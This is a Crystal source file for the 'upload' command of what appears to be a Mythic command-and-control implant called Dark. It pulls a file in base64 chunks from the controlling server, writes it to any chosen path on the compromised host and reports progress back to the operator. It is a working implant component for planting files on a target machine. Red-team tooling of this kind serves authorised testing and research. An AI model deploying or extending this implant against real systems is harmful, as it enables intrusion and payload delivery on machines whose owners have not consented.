require "./base"
require "base64"

module Dark::Agent::Commands
  class Upload < Base
    def name : String
      "upload"
    end

    def execute(task : JSON::Any) : Nil
      task_id = task["id"]?.try(&.as_s) || ""
      file_id = task["parameters"]["file"]?.try(&.as_s) || ""
      remote_path = task["parameters"]["remote_path"]?.try(&.as_s) || ""

      if file_id.empty?
        MessageHandler.add_response(task_id, :error, "No file specified for upload")
        return
      end

      if remote_path.empty?
        MessageHandler.add_response(task_id, :error, "No destination path specified")
        return
      end

      log_debug("Starting upload of file_id #{file_id} to #{remote_path}")

      # Send initial notification to Mythic UI
      MessageHandler.add_response(task_id, :info, "Starting upload to #{remote_path}\n")

      # Prepare to receive file chunks
      chunk_size = config.chunk_size
      chunk_num = 1
      total_chunks = 1 # Will be updated from first response

      # Use absolute path or relative to current directory
      file_path = remote_path.starts_with?('/') ? remote_path : File.join(Dir.current, remote_path)

      # Ensure directory exists
      dir_path = File.dirname(file_path)
      unless Dir.exists?(dir_path)
        begin
          Dir.mkdir_p(dir_path)
          log_debug("Created directory: #{dir_path}")
        rescue ex
          MessageHandler.add_response(task_id, :error, "Failed to create directory: #{dir_path} - #{ex.message}")
          return
        end
      end

      # Send initial request to get first chunk
      begin
        # Create or open the file for writing
        File.open(file_path, "wb") do |file|
          while chunk_num <= total_chunks
            # Request next chunk
            chunk_request = {
              "action" => "post_response",
              "responses" => [{
                "upload" => {
                  "chunk_size" => chunk_size,
                  "file_id" => file_id,
                  "chunk_num" => chunk_num,
                  "full_path" => file_path
                },
                "task_id" => task_id
              }]
            }

            # Get chunk data from server
            transport = Dark::Agent::Transport::Active.instance
            response_json = transport.send_and_receive(chunk_request.to_json)

            response_data = JSON.parse(response_json)
            chunk = response_data["responses"]?.try(&.[0]) || JSON.parse("{}")

            # Update total chunks from server response
            if chunk["total_chunks"]?
              total_chunks = chunk["total_chunks"].as_i
              if chunk_num == 1
                # Update UI with total chunks information when we first receive it
                MessageHandler.add_response(task_id, :info, "Got file info: #{total_chunks} total chunks to receive\n")
              end
            end

            if chunk["chunk_data"]?
              # Decode and write chunk data to file
              chunk_data = Base64.decode(chunk["chunk_data"].as_s)
              bytes_written = file.write(chunk_data)

              log_debug("Received chunk #{chunk_num}/#{total_chunks} (#{bytes_written} bytes)")

              # Send progress update to Mythic UI every 5th chunk or for first/last chunk
              if chunk_num == 1 || chunk_num % 5 == 0 || chunk_num == total_chunks
                progress_percent = (chunk_num.to_f / total_chunks * 100).to_i
                MessageHandler.add_response(task_id, :info, "Upload progress: #{chunk_num}/#{total_chunks} chunks (#{progress_percent}%)\n")
              end
            else
              log_error("Missing chunk data in response")
              break
            end

            # Move to next chunk
            chunk_num += 1
          end
        end

        log_debug("File upload complete: #{file_path}")

        # Create artifact for tracking
        MessageHandler.add_response(task_id, :artifact, base_artifact: "File Write", artifact: "#{file_path}", needs_cleanup: true)

        MessageHandler.add_response(task_id, :success, "Uploaded file to #{remote_path} successfully")
      rescue ex
        log_error("Error during file upload: #{ex.message}")
        log_error(ex.backtrace.join("\n"))
        # Clean up partial file on error
        File.delete(file_path) if File.exists?(file_path)
        MessageHandler.add_response(task_id, :error, "Error during file upload: #{ex.message}")
      end
    end
  end
end